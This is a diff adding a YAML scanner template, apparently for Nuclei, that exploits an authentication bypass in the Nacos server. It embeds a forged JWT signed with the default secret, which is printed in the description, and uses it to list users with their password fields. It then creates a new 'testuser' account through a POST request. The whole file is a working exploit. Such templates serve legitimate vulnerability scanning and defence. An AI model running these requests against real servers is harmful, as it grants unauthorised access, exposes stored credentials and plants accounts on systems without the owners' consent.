@@ -1,0 +1,74 @@
+http:
+- extractors:
+  - json:
+    - '{ name: .pageItems.[].username , pass: .pageItems.[].password }'
+    name: extract default username and password
+    part: body
+    type: json
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - '"username":'
+    - '"password":'
+  - part: header
+    type: word
+    words:
+    - application/json
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/nacos/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+  - '{{BaseURL}}/v1/auth/users?pageNo=1&pageSize=10&accessToken={{token}}'
+- body: username=testuser{{randstr_1}}&password={{randstr_2}}
+  extractors:
+  - json:
+    - .message
+    name: Create user testuser{{randstr_1}}/{{randstr_2}}
+    part: body
+    type: json
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    accessToken: '{{token}}'
+  matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    type: word
+    words:
+    - '"code":'
+    - '200'
+    - '"data":'
+    - '"create user ok!"'
+  - part: header
+    type: word
+    words:
+    - application/json
+  matchers-condition: and
+  method: POST
+  path:
+  - '{{BaseURL}}/nacos/v1/auth/users'
+  - '{{BaseURL}}/v1/auth/users'
+id: nacos-bypass-authentication
+info:
+  author: Esonhugh
+  classification:
+    cwe-id: cwe-281
+  description: 'Nasos bypass Auth with default jwt secret:
+
+    ''SecretKey012345678901234567890123456789012345678901234567890123456789''
+
+    '
+  name: Nacos Bypass Auth with default jwt secret
+  reference:
+  - https://github.com/alibaba/nacos/issues/10060
+  - https://avd.aliyun.com/detail?id=AVD-2023-1655789
+  - https://nacos.io/zh-cn/docs/auth.html
+  severity: critical
+  tags: cloud,nacos
+variables:
+  token: eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6LTF9.ybUomrBRXZhbUMWVgXRz3Q6zndbF-Zdk4RGpCnV-Ofs
